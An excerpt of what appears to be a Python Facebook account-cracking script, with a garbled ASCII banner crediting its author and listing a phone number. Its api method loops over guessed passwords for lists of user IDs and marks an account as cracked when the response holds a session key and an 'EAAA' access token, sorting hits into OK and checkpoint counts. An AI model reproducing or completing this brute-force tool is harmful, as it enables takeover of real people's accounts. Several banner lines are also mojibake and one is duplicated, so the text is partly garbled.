...
class Main:
	def __init__(self):
		...
		print ("""    
\033[1;91m    _____         _  _______ ____  
\033[1;93m  / ____|  /\   | |/ /_   _|  _ \ 
 \033[1;92m | (___   /  \  | ' /  | | | |_) |
 \033[1;91m  \___ \ / /\ \ |  <   | | |  _ < 
\033[1;92m    \___ \ / /\ \ |  <   | | |  _ < 
\033[1;93m   ____) / ____ \| . \ _| |_| |_) |
\033[1;92m  |_____/_/    \_\_|\_\_____|____/
                                     
    鈹屸攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹�
    鈹� [鉁揮 AUTHOR   : SAKIB            鈹�
    鈹� [鉁揮 GITHUB   : SAKIB-DX         鈹�
    鈹� [鉁揮 WHATSAPP : 01533648006        鈹�
    ...
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/iloveyou.shifa')
		else:
			Main()
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " SAKIB): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[SAKIB馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SAKIB-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
